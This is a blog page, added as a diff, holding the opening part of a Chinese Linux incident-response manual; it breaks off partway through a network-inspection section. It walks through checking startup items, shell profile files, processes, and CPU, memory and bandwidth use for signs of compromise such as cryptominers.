@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/favicon-32x32.ico" color="#222">
+  <meta name="baidu-site-verification" content="http://data.zz.baidu.com/urls?site=https://blog.sechelper.com&token=CxiR0obbVQeqayMP">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.sechelper.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"remove","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="网络安全应急响应手册 Linux 系列  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="助安社区 - 极度开放的网络安全自学社区">
+<meta property="og:url" content="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/index.html">
+<meta property="og:site_name" content="助安社区 - 极度开放的网络安全自学社区">
+<meta property="og:description" content="网络安全应急响应手册 Linux 系列  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp">
+<meta property="og:locale">
+<meta property="og:image" content="https://static.sechelper.com/img/qrcode/qrcode-group-01.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/12/06/562b478e779399ff1f9e5d2df17fff5e.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/12/06/d9c99c4d45882e318d405236aa08d48e.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/12/06/e461969b8759256c669193911b549b55.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/12/06/cd517fdfe7a0ef7ef7fd9d821054c0c0.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/12/06/5190c5de652348cfcdd6c78c9aeae824.png">
+<meta property="article:published_time" content="2023-03-27T01:44:43.258Z">
+<meta property="article:modified_time" content="2023-03-27T01:44:43.258Z">
+<meta property="article:author" content="狗头君师">
+<meta property="article:tag" content="助安社区,渗透测试,信息安全,网络安全,安全入门,代码审计,应急响应,web安全,系统安全,漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://static.sechelper.com/img/qrcode/qrcode-group-01.png">
+
+<link rel="canonical" href="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'cn'
+  };
+</script>
+
+  <title> | 助安社区 - 极度开放的网络安全自学社区</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">助安社区 - 极度开放的网络安全自学社区</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">关注公众号【助安社区】，订阅最优质网络安全学习知识</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section">主页</a>
+
+  </li>
+        <li class="menu-item menu-item-加入社区">
+
+    <a href="/join-us/" rel="section">加入社区</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section">关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section">标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section">分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section">归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+   <style type="text/css">
+  .qrcode-nav {
+	bottom: 40%;
+	box-sizing: border-box;
+	color: #000;
+	cursor: pointer;
+	opacity: 1;
+	padding: 0 6px;
+	position: fixed;
+	transition-property: bottom;
+	z-index: 1300;
+	width: initial;
+	margin-left: 80%;
+	high: 200;
+	width: 200px;
+}  
+   </style>
+  <div id="qrcode-nav" class="qrcode-nav">
+  <center><img src="https://static.sechelper.com/img/qrcode/blog-kun.png"><span><strong>加入社区</strong></span></center>
+  </div>
+<script>
+if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
+document.getElementById("qrcode-nav").hidden=true
+}
+</script>
+
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1><center>网络安全应急响应手册</center></h1>
+<h2><center>Linux 系列</center></h2>
+<p><img src="https://static.sechelper.com/img/qrcode/qrcode-group-01.png" alt="qrcode"></p>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作者：君师@助安社区</h3></center>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;版本：v1.0.3</h3>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发布时间：2022/12/07</h3>
+<div STYLE="page-break-after: always;"></div>
+<p><em>网络安全应急响应手册-Linux篇</em>是<strong>助安社区</strong>原创的应急干货合集，后续还会继续更新<em>网络安全应急响应手册-Windows篇</em>等系列。此系列文章对应b站视频观看效果更佳。扫码加入助安社区交流群，社区内部红队沙龙、资源共享和大厂工作经验。真正<strong>热爱安全</strong>和喜欢<strong>技术交流</strong>的小伙伴欢迎加入我们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1FG4y1Y7UQ</span><br></pre></td></tr></table></figure>
+<p>应急响应指遇到重大或突发事件后所采取的措施和行动。应急响应所处置的突发事件不仅仅包括硬件、产品、网络、配置等方面的故障，也包括各类安全事件，如：黑客攻击、木马病毒、勒索病毒、Web攻击等。</p>
+<span id="more"></span>
+<p><strong>处置手段</strong></p>
+<p>发现问题要处置，遵循原则：<code>百分百确认是非法文件，报备记录关停，摸棱两可找负责人确认，处置看沟通结果</code></p>
+<p><strong>环境信息：</strong></p>
+<ul>
+<li>Ubuntu 20.04.4 LTS</li>
+<li>XShell</li>
+</ul>
+<p>***注意：**linux版本之间有差异，具体以自己的系统版本为准</p>
+<h2 id="开机启动项"><a class="header-anchor" href="#开机启动项">¶</a>开机启动项</h2>
+<iframe src="//player.bilibili.com/player.html?aid=514675299&cid=809910075&bvid=BV1Ag411r7Wd&ts=55382669" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<p>伴随开机启动，一般生产服务器很少重启，但是为防止被控机器失联部分木马会添加开机启动项作为复活手段。</p>
+<h3 id="etc-rc-local"><a class="header-anchor" href="#etc-rc-local">¶</a>/etc/rc.local</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh -e</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># rc.local</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This script is executed at the end of each multiuser runlevel.</span></span><br><span class="line"><span class="comment"># Ensure that the script will &quot;exit 0&quot; on success or any other</span></span><br><span class="line"><span class="comment"># value on error.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To enable or disable this script, just change the execution</span></span><br><span class="line"><span class="comment"># bits.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default, this script does nothing.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /root/1.txt</span><br></pre></td></tr></table></figure>
+<h3 id="etc-rc-d-rc-local"><a class="header-anchor" href="#etc-rc-d-rc-local">¶</a>/etc/rc.d/rc.local</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is highly advisable to create own systemd services or udev rules</span></span><br><span class="line"><span class="comment"># to run scripts during boot instead of using this file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In contrast to previous versions due to parallel execution during boot</span></span><br><span class="line"><span class="comment"># this script will NOT be run after all other services.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please note that you must run &#x27;chmod +x /etc/rc.d/rc.local&#x27; to ensure</span></span><br><span class="line"><span class="comment"># that this script will be executed during boot.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /var/lock/subsys/local</span><br><span class="line"><span class="built_in">touch</span> /tmp/1.txt</span><br></pre></td></tr></table></figure>
+<h3 id="etc-rc-d-init-d"><a class="header-anchor" href="#etc-rc-d-init-d">¶</a>/etc/rc.d/init.d/</h3>
+<p>这个目录下面放了可执行脚本或文件</p>
+<h3 id="etc-rc-d"><a class="header-anchor" href="#etc-rc-d">¶</a>/etc/rc*.d/</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc0.d/ rc1.d/ rc2.d/ rc3.d/ rc4.d/ rc5.d/ rc6.d/ rcS.d/</span><br></pre></td></tr></table></figure>
+<h3 id="systemctl-list-unit-files"><a class="header-anchor" href="#systemctl-list-unit-files">¶</a>systemctl list-unit-files</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ssh.service                            enabled         enabled      </span><br><span class="line">ssh@.service                           static          enabled      </span><br><span class="line">sshd.service                           enabled         enabled      </span><br><span class="line">sudo.service                           masked          enabled      </span><br><span class="line">syslog.service                         enabled         enabled      </span><br><span class="line">system-update-cleanup.service          static          enabled      </span><br><span class="line">systemd-ask-password-console.service   static          enabled      </span><br><span class="line">systemd-ask-password-plymouth.service  static          enabled      </span><br><span class="line">systemd-ask-password-wall.service      static          enabled      </span><br><span class="line">systemd-backlight@.service             static          enabled   </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>发现恶意服务，使用下面命令关停（以关闭<code>ufw.service</code>服务作为实例）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop ufw.service <span class="comment"># 停止服务</span></span><br><span class="line">sudo systemctl <span class="built_in">disable</span> ufw.service <span class="comment"># 删除开启启动</span></span><br></pre></td></tr></table></figure>
+<p>关错了，避免尴尬偷偷启动服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start ufw.service <span class="comment"># 启动服务</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> ufw.service <span class="comment"># 添加开启启动</span></span><br></pre></td></tr></table></figure>
+<h2 id="环境变量配置文件"><a class="header-anchor" href="#环境变量配置文件">¶</a>环境变量配置文件</h2>
+<iframe src="//player.bilibili.com/player.html?aid=344818165&cid=811364156&bvid=BV1ud4y1A7jE&ts=55385854" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/profile</span><br><span class="line">/etc/bashrc</span><br><span class="line">/etc/bash.bashrc </span><br><span class="line">~/.bashrc</span><br><span class="line">~/.profile </span><br><span class="line">~/.bash_profile</span><br></pre></td></tr></table></figure>
+<p>这些文件用于设置系环境变量或启动程序，每次Linux登入或切换用户都会触发这些文件。</p>
+<p><img src="https://static.sechelper.com/img/2022/12/06/562b478e779399ff1f9e5d2df17fff5e.png" alt="linux执行顺序"></p>
+<center>图1 Linux登入环境环境变量触发顺序 </center>
+<p>切换用户时也会触发环境变量文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo su</span><br></pre></td></tr></table></figure>
+<h3 id="bash-logout"><a class="header-anchor" href="#bash-logout">¶</a>~/.bash_logout</h3>
+<p>登出账户时触发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ exit</span><br><span class="line">logout</span><br><span class="line">~/.bash_logout</span><br></pre></td></tr></table></figure>
+<h2 id="各项资源异常"><a class="header-anchor" href="#各项资源异常">¶</a>各项资源异常</h2>
+<iframe src="//player.bilibili.com/player.html?aid=217356590&cid=811372793&bvid=BV1na411G7YH" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<p>进程是Linux当前正在处理的任务，当运行某个软件时将为其创建一个进程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo ps -efcaux # 查看所有进程</span><br><span class="line">...</span><br><span class="line">www-data   97735  0.0  1.8 309560 65456 ?        S    Aug20   0:13  \_ php-fpm7.4</span><br><span class="line">syslog       785  0.0  0.1 224492  5528 ?        Ssl  Aug17   0:03 rsyslogd</span><br><span class="line">ntp          796  0.0  0.1  74632  4240 ?        Ssl  Aug17   0:13 ntpd</span><br><span class="line">root         802  0.0  0.2  17176  8044 ?        Ss   Aug17   0:03 systemd-logind</span><br><span class="line">root         816  0.0  0.2  12172  7436 ?        Ss   Aug17   0:04 sshd</span><br><span class="line">root      126262  0.0  0.2  13920  8852 ?        Ss   15:47   0:00  \_ sshd</span><br><span class="line">ubuntu    126363  0.0  0.1  14052  6260 ?        S    15:47   0:00      \_ sshd</span><br><span class="line">ubuntu    126364  0.0  0.1   8276  5216 pts/0    Ss   15:47   0:00          \_ bash</span><br><span class="line">root      130670  0.0  0.1   9404  4752 pts/0    S    18:59   0:00              \_ sudo</span><br><span class="line">root      130671  0.0  0.1   8260  4252 pts/0    S    18:59   0:00                  \_ su</span><br><span class="line">root      130672  0.0  0.1   7236  4056 pts/0    S    18:59   0:00                      \_ bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>查找进程文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo lsof -p 948 # 查看pid为948的进程详细信息</span><br><span class="line">COMMAND PID USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME</span><br><span class="line">dockerd 948 root  cwd       DIR                8,2     4096          2 /</span><br><span class="line">dockerd 948 root  rtd       DIR                8,2     4096          2 /</span><br><span class="line">dockerd 948 root  txt       REG                8,2 95757512    2883867 /usr/bin/dockerd</span><br><span class="line">dockerd 948 root  mem-W     REG                8,2    32768    2231986 /var/lib/docker/buildkit/cache.db</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo ls -al /proc/948/exe # 查看pid为948的进程文件绝对路径</span><br><span class="line">lrwxrwxrwx 1 root root 0 Aug 21 03:24 /proc/948/exe -&gt; /usr/bin/dockerd</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cwd</td>
+<td>符号链接（类似快捷方式）的是进程运行目录</td>
+</tr>
+<tr>
+<td>exe</td>
+<td>符号链接（类似快捷方式）的是执行程序的绝对路径</td>
+</tr>
+<tr>
+<td>cmdline</td>
+<td>符号链接（类似快捷方式）的是进程运行目录</td>
+</tr>
+<tr>
+<td>environ</td>
+<td>记录进程运行时系统的环境变量</td>
+</tr>
+</tbody>
+</table>
+<center>表1 进程符号链接参考 </center>
+<p><strong>CPU</strong></p>
+<p>CPU也称为中央处理器、主处理器或单处理器，是执行计算机指令得关键部件，某服务器突然有一个进程占用的CPU远超平时，那么可能被植入了挖矿病毒。</p>
+<blockquote>
+<p>排查话术：CPU是否远超平时居高不下，如果是的话那么可能被植入了挖矿病毒。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ top # 排名越靠前占用的CPU越多</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/12/06/d9c99c4d45882e318d405236aa08d48e.png" alt="Snipaste_2022-12-06_09-57-06"></p>
+<center>图2 top命令结果 </center>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ ps -aux| sort -k3nr | head -10</span><br><span class="line">root       12039  122  3.4 3554048 139720 ?      Sl   08:18   0:02 /usr/local/jdk-17.0.3.1/bin/java -Djava.util.logging.config.file=/usr/local/apache-tomcat-10.0.22/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/apache-tomcat-10.0.22/bin/bootstrap.jar:/usr/local/apache-tomcat-10.0.22/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/apache-tomcat-10.0.22 -Dcatalina.home=/usr/local/apache-tomcat-10.0.22 -Djava.io.tmpdir=/usr/local/apache-tomcat-10.0.22/temp org.apache.catalina.startup.Bootstrap start</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><strong>内存</strong></p>
+<p>程序启动时会被系统读入内存，在执行的过程也不断的在内存中申请新的空间。</p>
+<blockquote>
+<p>排查话术：最近内存是否突然升高持续不下，如果是的话那么可能被植入了挖矿病毒。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$  ps -aux | sort -k4nr | head -10 # 内存占用最高的是个进程</span><br><span class="line">root         948  0.0  1.9 1308116 78424 ?       Ssl  03:24   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">root         859  0.0  1.2 1355640 51364 ?       Ssl  03:24   0:14 /usr/bin/containerd</span><br><span class="line">root         851  0.0  1.0 874552 42960 ?        Ssl  03:24   0:01 /usr/lib/snapd/snapd</span><br><span class="line">root         890  0.0  0.5 107916 20864 ?        Ssl  03:24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><strong>网络带宽</strong></p>
+<p>带宽也就是网速的最高上限，比如家里的100/M带宽，就是每秒100M的传输速度，带宽分为上行和下行对应着上传下载，某服务器上行流量比往常高出几倍时，说明在外发大量的数据重点检查是否为正常业务。</p>
+<blockquote>
+<p>排查话术：网络流量上下行有异常吗？有异常的话是哪个IP？</p>
+</blockquote>
+<p>网络占用需要安装软件辅助，应急时大部分情况都不允许随意安装软件，这时候就需要和运维的网络沟通，从设备上看下流量情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo apt-get install iftop # centos使用 yum install iftop</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  iftop</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 54 not upgraded.</span><br><span class="line">Need to get 36.3 kB of archives.</span><br><span class="line">After this operation, 95.2 kB of additional disk space will be used.</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu focal/universe amd64 iftop amd64 1.0~pre4-6build1 [36.3 kB]</span><br><span class="line">Fetched 36.3 kB in 1s (24.6 kB/s)</span><br><span class="line">Selecting previously unselected package iftop.</span><br><span class="line">(Reading database ... 108839 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../iftop_1.0~pre4-6build1_amd64.deb ...</span><br><span class="line">Unpacking iftop (1.0~pre4-6build1) ...</span><br><span class="line">Setting up iftop (1.0~pre4-6build1) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br></pre></td></tr></table></figure>
+<p>使用<code>iftop</code>命令分析网络时，需要指定网卡，一个生产机器服务器会有很多块网卡，有管理用的、业务用的或其它的，这时候要与运维沟通区分各个网卡的用途。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ ip addr # ifconfig 